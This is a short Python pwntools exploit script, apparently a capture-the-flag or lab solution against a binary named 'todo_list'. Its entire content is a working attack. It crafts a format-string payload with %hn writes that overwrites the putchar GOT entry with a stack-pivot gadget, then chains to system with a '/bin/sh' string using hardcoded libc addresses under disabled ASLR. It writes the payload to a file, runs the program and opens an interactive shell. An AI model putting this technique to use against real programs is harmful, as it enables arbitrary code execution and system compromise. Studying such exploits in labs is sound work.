

from pwn import *

putchar = 0x0804b054
system = 0xb7e42da0
exit = 0xb7e369d0
sh = 0xb7f639ab	

pay = ""
pay += p32(putchar+2)
pay += p32(putchar)
pay += p32(system)
pay += p32(exit)
pay += p32(sh)

# ASLR disable
# ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only "add|pop|ret" |grep esp
# 0x000c5ffd : add esp, 0x28 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# libcbase 0xb7e08000
# 0xb7e08000 + 0x000c5ffd = 0xb7ecdffd

part1 = int("0xb7ec", 16)
part2 = int("0xdffd", 16)

pay += "%{}x%{}$hn".format(part1-20, 11)
pay += "%{}x%{}$hn".format(part2-part1, 12)

f = open('user/shell', 'w')
f.write(pay)
f.close()

p = process("./todo_list")
p.send("user\npass\nv\nshell\n")
p.interactive()
p.close()







